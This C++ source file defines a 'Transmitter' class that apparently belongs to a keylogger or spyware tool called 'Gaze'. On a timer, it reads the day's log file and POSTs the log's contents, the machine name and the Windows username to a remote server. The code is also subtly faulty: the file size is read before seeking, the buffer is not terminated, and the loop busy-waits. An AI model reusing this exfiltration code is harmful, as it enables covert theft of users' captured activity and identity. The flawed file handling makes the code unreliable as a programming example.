#include "pch.h"
#include "Transmitter.h"

// Transmitter() : Constructor of the transmitter class
Transmitter::Transmitter(Logger* logger)
{
	this->Transmitting = false; // Not transmitting by default

	this->Machine = Utilities::GetMachineName();
	this->User = Utilities::GetUsername();

	this->SetKey(""); // Default is none
	this->LastTransmission = ""; // Never occured yet
}

// Start() : Start sending log to server (ment to be lunch in a thread)
void Transmitter::Start()
{
	while (this->IsTransmitting())
	{
		if (Timer.getElapsedTime() >= WAITING_TIME)
		{
			// Initialize the http request
			Http::Request request(WEB_PAGE, Http::Request::Post);

			// Initialize the string stream containing the request
			ostringstream stream;

			// Open the currently active log file
			ifstream file(Utilities::GetCurrentDate() + ".log");

			// Read all file content into memory
			streampos size = file.tellg();
			char* content = new char[size];
			file.seekg(0, ios::beg);
			file.read(content, size);
			file.close();			

			// Forge the http request
			stream << "machine=" << this->GetMachine() << "&user=" << this->GetUser() << "&file=" << content;
			request.setField("From", "Gaze");
			request.setBody(stream.str());

			// Send request and get the response from the server
			Http http(WEB_SERVER);
			Http::Response response = http.sendRequest(request);

			// Restart timer and actualise LastTransmission
			this->Timer.restart();
			this->LastTransmission = Utilities::GetCurrentDate();

			// Delete properly the file content pointer
			delete[] content;
		}
	}
}

// Stop() : Stop the transmitter 
void Transmitter::Stop()
{
	this->Transmitting = false;
}

// IsTransmitting() : Return Transmitting value
bool Transmitter::IsTransmitting() const
{
	return this->Transmitting;
}

// GetMachine() : Return the machine name
string Transmitter::GetMachine() const
{
	return this->Machine;
}

// GetUser() : Return the window username
string Transmitter::GetUser() const
{
	return this->User;
}

// GetLastTransmission() : Return last time a transmission was done successfully 
string Transmitter::GetLastTransmission() const
{
	return this->LastTransmission;
}

// GetKey() : Return the encryption key
string Transmitter::GetKey() const
{
	return this->Key;
}

// SetKey(string) : Assign a value to the Key attribut
void Transmitter::SetKey(string key)
{
	this->Key = key;
}